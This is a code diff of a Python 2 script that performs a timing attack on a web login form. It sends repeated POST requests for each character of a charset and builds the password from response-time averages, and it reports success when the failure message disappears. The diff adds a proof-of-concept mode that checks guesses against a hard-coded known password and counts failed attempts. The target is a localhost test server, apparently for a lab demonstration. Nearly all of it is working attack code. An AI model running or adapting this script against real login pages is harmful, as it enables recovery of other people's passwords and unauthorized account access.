@@ -3,14 +3,20 @@
     This script attempts to perform timing attacks on web applications. It will
     make a given number of requests to a web server with a specified character 
     set. It will then take the average of the amount of time it took for each 
-    character to be processed, and add that to the variable containing what is
-    guessed to be the correct password.
+    character to be processed, and add the most likely character to the 
+    variable containing what is guessed to be the correct password.
 '''
 
 import time
 import requests
 import string
 import sys
+
+# for when running in proof of concept mode
+# this will keep track of the number of failed times the program executes before
+# it is able to get the correct password through a timing attack
+KNOWNPASSWORD = 'abc'
+FAILEDPOCS = 0
 
 USERNAME = 'test'
 URL = 'http://localhost:3000/login'
@@ -21,7 +27,7 @@ CHARSET = 'abcde'
 FAILLOGINMESSAGE = 'Invalid username/password combination'
 
 # set to be the number of requests to set to the server for every character
-NUMREQUESTS = 300
+NUMREQUESTS = 10
 
 # POST parameter variable names
 USERNAMEPOSTPARAM = 'username'
@@ -34,11 +40,13 @@ def makerequest(guess):
         total amount of time it took for the server to respond to all of 
         the requests containing that character
 
-        Return: the assumed value for the correct character (based on the 
-        lowest time value in the dict of characters)
+        Return: the substring of the assumed value for the correct password 
+        (based on the highest time value in the dict of characters)
     '''
     chartimes = {}
     chartimeavg = {}
+    global FAILEDPOCS
+    global KNOWNPASSWORD
 
 
     # for every character in the characterset, make a request
@@ -58,6 +66,7 @@ def makerequest(guess):
 
             # if the response doesn't contain the following string, you successfully logged in and now have the password
             if FAILLOGINMESSAGE not in r.text:
+                print "SUCCESS: Number of failed timing attack attempts before success: " + str(FAILEDPOCS)
                 print "Successfully logged in! Username: " + USERNAME + " Password: " + newguess
                 sys.exit()
             #print "response is: " + r.text
@@ -78,6 +87,11 @@ def makerequest(guess):
         if n == len(chartimeavg.keys())-1:
             newguess = guess + key
             print "Guessing password begins with: '" + newguess + "'"
+            if newguess != KNOWNPASSWORD[:len(newguess)]:
+                print "'" + newguess + "' != '" + KNOWNPASSWORD[:len(newguess)] + "'"
+                FAILEDPOCS += 1
+                print "Number of failed timing attack attempts: " + str(FAILEDPOCS) + "\n"
+                main()
             return newguess
         n += 1
 
@@ -102,7 +116,7 @@ def getaverage(chartimes):
     return chartimeavg
 
 
-if __name__ == '__main__':
+def main():
     temppass = ''
 
     print "Attempting to log into " + URL + " as user '" + USERNAME + "'"
@@ -112,3 +126,6 @@ if __name__ == '__main__':
 
     while True:
         temppass = makerequest(temppass)
+
+if __name__ == '__main__':
+    main()
